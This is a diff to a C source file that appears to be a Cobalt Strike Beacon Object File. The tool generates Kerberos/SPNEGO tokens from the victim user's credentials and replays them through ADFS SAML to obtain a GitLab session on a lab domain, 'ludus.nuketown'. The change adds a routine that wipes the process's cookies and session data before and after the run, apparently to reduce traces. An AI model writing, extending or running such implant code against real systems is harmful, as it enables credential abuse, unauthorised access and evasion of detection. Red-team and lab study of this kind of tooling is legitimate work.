@@ -27,8 +27,8 @@ extern "C" {
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "Wininet.lib")
 #endif
-    // ==================== CONFIGURATION - MODIFY THESE ====================
-    // Domain and network configuration
+ // ==================== CONFIGURATION - MODIFY THESE ====================
+ // Domain and network configuration
 #define TARGET_DOMAIN "ludus.nuketown"
 #define GITLAB_HOST "gitlab.ludus.nuketown"
 #define ADFS_HOST "adfs.ludus.nuketown"
@@ -72,6 +72,7 @@ extern "C" {
     char* perform_request_2_post_saml_auth(HINTERNET hSession, HINTERNET hConnect, const char* token, char** redirect_location);
     char* perform_request_3_follow_redirects(HINTERNET hSession, HINTERNET hConnect, const char* initialLocation, const char* base64Token, char** last_referer);
     void perform_request_4_post_saml_callback(HINTERNET hSession, HINTERNET hConnect, const char* samlResponse, const char* referer);
+    void clear_all_cookies();
     // ==================== MAIN ENTRY POINT ====================
     void go(PCHAR args, int len) {
         // Initialize all variables at the top to avoid goto issues
@@ -86,7 +87,7 @@ extern "C" {
         char* lastReferer = NULL;
         BOOL credHandleForAdfsAcquired = FALSE;
         BOOL ctxForAdfsInitialized = FALSE;
-
+        clear_all_cookies();
         // Setup HTTP session
         hSession = setup_http_session();
         if (!hSession) {
@@ -162,6 +163,8 @@ extern "C" {
         if (base64TokenForAdfs) intFree(base64TokenForAdfs);
         if (ctxForAdfsInitialized) DeleteSecurityContext(&hCtxForAdfs);
         if (credHandleForAdfsAcquired) FreeCredentialsHandle(&hCredForAdfs);
+        clear_all_cookies();
+
     }
     // ==================== SPNEGO TOKEN GENERATION ====================
     char* generate_spnego_token(CredHandle* hCredHandle, CtxtHandle* hNewCtx) {
@@ -998,6 +1001,16 @@ extern "C" {
         DWORD err = GetLastError();
         BeaconPrintf(CALLBACK_ERROR, "%s (Error: %lu)", msg, err);
     }
+    void clear_all_cookies() {
+        // This clears ALL cookies and cache for the current process
+        if (!InternetSetOption(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0)) {
+            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to clear session (Error: %lu)", GetLastError());
+        }
+        else {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] All cookies and session data cleared");
+        }
+    }
+
     // ==================== CLEANUP ====================
     void bofstop() {
 #ifdef DYNAMIC_LIB_COUNT
